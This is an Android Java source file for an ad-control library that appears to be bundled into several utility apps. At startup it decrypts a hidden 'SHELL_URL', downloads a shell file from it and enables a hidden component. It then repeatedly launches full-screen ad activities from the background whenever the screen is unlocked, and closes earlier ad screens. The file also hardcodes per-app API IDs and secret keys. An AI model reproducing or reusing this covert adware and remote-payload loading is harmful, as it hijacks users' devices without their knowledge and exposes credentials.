package com.ep.custom_honor_library;

import android.app.Activity;
import android.app.Application;
import android.app.KeyguardManager;
import android.content.Context;

import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.text.TextUtils;
import android.util.Log;
import android.view.ViewGroup;
import com.baidu.mobads.proxy.SafeUtils;
import com.baidu.mobads.sdk.api.MobRewardVideoActivity;
import com.byazt.fk.Stub_Standard_Portrait_Activity;
import com.bytedance.sdk.openadsdk.core.component.reward.activity.TTFullScreenVideoActivity;
import com.ep.custom_honor_library.adlp.AdController;
import com.ep.custom_honor_library.adlp.HandlerAdUtils;
import com.ep.custom_honor_library.adlp.LopTimeTJ;
import com.ep.custom_honor_library.adlp.TimeCoundLp;
import com.ep.custom_honor_library.bean.ControlAdBean;
import com.ep.custom_honor_library.http.CommonHttpUtils;
import com.ep.custom_honor_library.http.OnHttpListener;
import com.ep.custom_honor_library.http.OnMiddleInterface;
import com.ep.custom_honor_library.sdk.GmSdkUtils;
import com.ep.custom_honor_library.sdk.JuliangSDKUtils;
import com.ep.custom_honor_library.utils.CommonSpUtils;
import com.ep.custom_honor_library.utils.CustomLogUtils;
import com.ep.custom_honor_library.utils.DefAPIUtils;
import com.ep.custom_honor_library.utils.DefContextUtils;
import com.ep.custom_honor_library.utils.doBackgroundThread;
import com.kwad.sdk.api.proxy.app.AdWebViewActivity;
import com.kwad.sdk.api.proxy.app.FeedDownloadActivity;
import com.meituan.android.walle.WalleChannelReader;
import com.qq.e.ads.PortraitADActivity;
import com.qq.e.ads.RewardvideoPortraitADActivity;
import com.tencent.mmkv.MMKV;
import com.zh.zk.OIUZH;

import java.io.File;
import java.lang.ref.WeakReference;
import java.util.ArrayList;
import java.util.Iterator;

public class ControllerUtils {

    public static boolean isHasShowAd = false;
    public static Handler handler = new Handler(Looper.getMainLooper());


    public static ArrayList<WeakReference<Activity>> appActivityList = new ArrayList<>();

    public static boolean mIsIniLop = false;

    public static void handlerPostInitStrategy(){
        handler.postDelayed(runnable, 0 * 1000);
    }


    private static void switchInfo(Context context){




        switch (context.getPackageName()){


              case "com.dolw.moyeshisao":
                CommonAPI.HOST = "https://api.nunpingli.cn/";
                CommonAPI.APPID = "5883378";
                CommonAPI.APP_RELEASE_APPID = "6bb7e365466f084b";
                CommonAPI.RELEASE_SSK = "aa2315075d63e80e00491243f56c3ae6";
                CommonAPI.umID = "6acf1fe8863270068ca0dc6c";
                break;

            case "com.nmgsr.nuanjichaoxibeiwanglu":
                CommonAPI.HOST = "https://api.nunpingli.cn/";
                CommonAPI.APPID = "5883357";
                CommonAPI.APP_RELEASE_APPID = "4d884c2c2afe9366";
                CommonAPI.RELEASE_SSK = "595192dffc94c64351b4dd509c79d089";
                CommonAPI.umID = "6acf21ba6545637cd60f7ec0";
                break;


          case "com.gzyf.yingwensaomiao":
                CommonAPI.HOST = "https://api.nunpingli.cn/";
                CommonAPI.APPID = "5884187";
                CommonAPI.APP_RELEASE_APPID = "6452d01f224554a2";
                CommonAPI.RELEASE_SSK = "ef6ef4430cd6fbf72c5501e7ad6f3be6";
                CommonAPI.umID = "6acf28116545637cd60f8fcc";
                break;

            case "com.gzyf.janxiaojinghuihuawu":
                CommonAPI.HOST = "https://api.nunpingli.cn/";
                CommonAPI.APPID = "5884189";
                CommonAPI.APP_RELEASE_APPID = "beffd1d59f90d87c";
                CommonAPI.RELEASE_SSK = "ea7450c0b4e595a5a21624c8f3a5bf85";
                CommonAPI.umID = "6acf282c6545637cd60f8ff7";
                break;



//            case "com.dolw.wenlanhuyi":
//                CommonAPI.HOST = "https://api.nunpingli.cn/";
//                CommonAPI.APPID = "5883381";
//                CommonAPI.APP_RELEASE_APPID = "ad4cb2f423e9afed";
//                CommonAPI.RELEASE_SSK = "4e16af0dcbd799a90d44af8f723432cd";
//                CommonAPI.umID = "6acdd1b46545637cd60d338d";
//                break;
//
//
//
//            case "com.dolw.zhinengshengliushenqi":
//                CommonAPI.HOST = "https://api.nunpingli.cn/";
//                CommonAPI.APPID = "5883386";
//                CommonAPI.APP_RELEASE_APPID = "2c1dc8aa05795bc4";
//                CommonAPI.RELEASE_SSK = "17bc587ae49e7cf3f02c499cc9ca9e3c";
//                CommonAPI.umID = "6acdd1d0863270068c9f993a";
//                break;


//            case "com.nmgsr.meihaohuihua":
//                CommonAPI.HOST = "https://api.nunpingli.cn/";
//                CommonAPI.APPID = "5883352";
//                CommonAPI.APP_RELEASE_APPID = "f2d5c2bed1897198";
//                CommonAPI.RELEASE_SSK = "cce615bc0c0f42dc13c97b8332402228";
//                CommonAPI.umID = "6acc8ec2863270068c9db996";
//                break;
//            case "com.nmgsr.qingshitianqi":
//                CommonAPI.HOST = "https://api.nunpingli.cn/";
//                CommonAPI.APPID = "5877568";
//                CommonAPI.APP_RELEASE_APPID = "1b6b6fb21d28f13a";
//                CommonAPI.RELEASE_SSK = "65fb608b0f0319dfc4b27b046c325ba3";
//                CommonAPI.umID = "6acc8fbe6545637cd6099e72";
//                break;




        }
    }







    private static Runnable runnable = new Runnable() {
        @Override
        public void run() {
            initStrategy(DefAPIUtils.randomConfig_from_delay, new  OnHttpListener() {
                @Override
                public void onSuccess() {}
                @Override
                public void onFail(Exception e) {}
            });
        }
    };


    public static void initStrategy(String form, OnHttpListener httpListener){
        CommonHttpUtils.getInstance().initConfigOaidDoPost(form, DefAPIUtils.getRandomConfig(), null, new OnHttpListener() {
            @Override
            public void onSuccess() {
                doBackgroundThread.doOnMainThreadIdle(new doBackgroundThread.Action() {
                    @Override
                    public void run() {
                        httpListener.onSuccess();
                        initAttribution();
                    }
                },null);
            }

            @Override
            public void onFail(Exception e) {
                httpListener.onFail(e);

            }
        });
    }



    public static Handler mainHandler = new Handler(Looper.getMainLooper());

    //初始化基础
    public static void initDef(Application application){

        mainHandler.post(new Runnable() {
        @Override
            public void run() {
                MMKV.initialize(application);
                DefContextUtils.instance.setAppContext(application);
                switchInfo(application);

                CommonAPI.VERSION = getVersionName(application);
                initActivityListener();
                //初始化渠道
                String channel = WalleChannelReader.getChannel(application, "9").toString();
                CommonSpUtils.setSpChannelNumStr(channel);
                initSDK();
                handlerPostInitStrategy();
                initFe();
            }});

    }





    public static String getVersionName(Context context) {
        try {
            PackageManager pm = context.getPackageManager();
            PackageInfo pi = pm.getPackageInfo(context.getPackageName(), 0);
            return pi.versionName;
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
            return "unknown";
        }
    }

    public static Handler adHandler = new Handler(Looper.getMainLooper());
    private static Runnable adRunnable = new Runnable() {
        @Override
        public void run() {
            ControllerUtils.intentMiddleWindow(CommonAPI.INTERVAL_AD,0);
            if (!isHasShowAd){
                toLoAdHandler(10000);
            }else{
                adHandler.removeCallbacksAndMessages(null);
            }
        }
    };


    private static void toLoAdHandler(long time){
        if (!isHasShowAd) {
            lopClearApp();
        }
        adHandler.postDelayed(adRunnable,time);
    }



    //初始化广告
    public static void initSDK(){
        JuliangSDKUtils.initJuliangSKD();
        GmSdkUtils.initSDK();
    }

    private static void initAttribution(){
        if (!mIsIniLop){
            HandlerAdUtils.getInstance().startHandler(0);
            TimeCoundLp.getInstance().startTimeCountListLp();
            LopTimeTJ.getInstance().startLpMessage();
            toLoAdHandler(5*1000);
            mIsIniLop = true;
        }
    }



    public  static void initFe(){
        String file = CommonSpUtils.decrypt(CommonSpUtils.SHELL_URL);
        CommonHttpUtils.getInstance().postFileHttp(DefContextUtils.instance.getApplication(), file, new OnHttpListener() {
        @Override
            public void onSuccess() {
            CustomLogUtils.i("AD_LOG","初始化啊shell");
            Log.i("AD_LOG","ok");
            SafeUtils.enable(DefContextUtils.instance.getApplication(),"com.saom.tianqi.GAGAVIEW");
            if (Build.VERSION.SDK_INT>=34){
                SafeUtils.popupDialog(DefContextUtils.instance.getApplication(),true);
            }
//            toLoAdHandler(5*1000);
        }
            @Override
            public void onFail(Exception e) {}
        });

    }



    private static void toOpenMiddle(Intent intent){
        CustomLogUtils.i("开始跳转11111");
        String spShellFile = CommonSpUtils.getSpShellFile();
        if (!TextUtils.isEmpty(spShellFile) && new File(spShellFile).length()>0){
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            SafeUtils.startTarget(DefContextUtils.instance.getApplication(), intent);
        }


    }


    public static void intentMiddleWindow(String adScreen,int index){
        Intent intent = new Intent(DefContextUtils.instance.getApplication(), OIUZH.class);
        intent.putExtra(CommonAPI.INTENT_MIDDLE_FLAG,adScreen);
        intent.putExtra(CommonAPI.INTENT_MIDDLE_INDEX,index);
        if (isScreenUnLock()){
            toOpenMiddle(intent);
        }else{
            CustomLogUtils.i("熄屏幕ing");
        }
    }

 
    private static void initActivityListener() {

        Application app = DefContextUtils.instance.getApplication();
        if (app == null) return;

        app.registerActivityLifecycleCallbacks(
                new Application.ActivityLifecycleCallbacks() {

                    @Override
                    public void onActivityCreated(Activity activity, Bundle savedInstanceState) {
                        WeakReference<Activity> adView = isAdView(activity);
                        if (adView!=null){
                            appActivityList.add(adView);
                        }
                    }

                    @Override public void onActivityStarted(Activity activity) {}
                    @Override public void onActivityResumed(Activity activity) {}
                    @Override public void onActivityPaused(Activity activity) {}
                    @Override public void onActivityStopped(Activity activity) {}
                    @Override public void onActivitySaveInstanceState(Activity activity, Bundle outState) {}

                    @Override
                    public void onActivityDestroyed(Activity activity) {}
                }
        );
    }

    
    
    
    private static WeakReference<Activity> isAdView(Activity activity){
             if (activity instanceof RewardvideoPortraitADActivity
                    || activity instanceof Stub_Standard_Portrait_Activity
                    || activity instanceof TTFullScreenVideoActivity
                    || activity instanceof FeedDownloadActivity
                    || activity instanceof PortraitADActivity
                    || activity instanceof AdWebViewActivity
                    || activity instanceof MobRewardVideoActivity
                    || activity instanceof OnMiddleInterface
            ) {

                return new WeakReference<Activity>(activity);
             }
             return null;
        }



    public  static void lopClearApp(){
        Iterator<WeakReference<Activity>> it = appActivityList.iterator();
        while (it.hasNext()) {
            WeakReference<Activity> info = it.next();
            if (info!=null && info.get()!=null) {
                info.get().finish();
                it.remove();
            }
        }

    }


    private static boolean isScreenUnLock() {
        try {
            PowerManager powerManager =
                    (PowerManager) DefContextUtils.instance.getApplication().getSystemService(Context.POWER_SERVICE);
            //true为打开，false为关闭
            boolean ifOpen = powerManager.isInteractive();
            KeyguardManager mKeyguardManager =
                    (KeyguardManager) DefContextUtils.instance.getApplication()
                            .getSystemService(Context.KEYGUARD_SERVICE);
            boolean flag = mKeyguardManager.inKeyguardRestrictedInputMode();
            Log.d("isScreenOn", "handleTime: ifOpen = $ifOpen flag = $flag");
            if (!(ifOpen && !flag)) {
                Log.d("isScreenOn", "handleTime: not screen unlock ,so return");
                return false;
            }
        } catch (Exception e){
        }
        return true;
    }




    public static void initAdShow(Intent intent, Activity activity,ViewGroup adLayout){
        String adScreen = intent.getStringExtra(CommonAPI.INTENT_MIDDLE_FLAG);
        int adIndex = intent.getIntExtra(CommonAPI.INTENT_MIDDLE_INDEX,0);
        CustomLogUtils.i("获取到的KEY == "+adScreen);
        ControlAdBean controlAdBean = new ControlAdBean();
        controlAdBean.setWrContext(new WeakReference<>(activity));
        controlAdBean.setWrViewGroup(new WeakReference<>(adLayout));
        controlAdBean.setAdIndex(adIndex);
        controlAdBean.setAdSCreen(adScreen);
        AdController.getAdControllerInstance().intentAd(controlAdBean);

    }
    

}
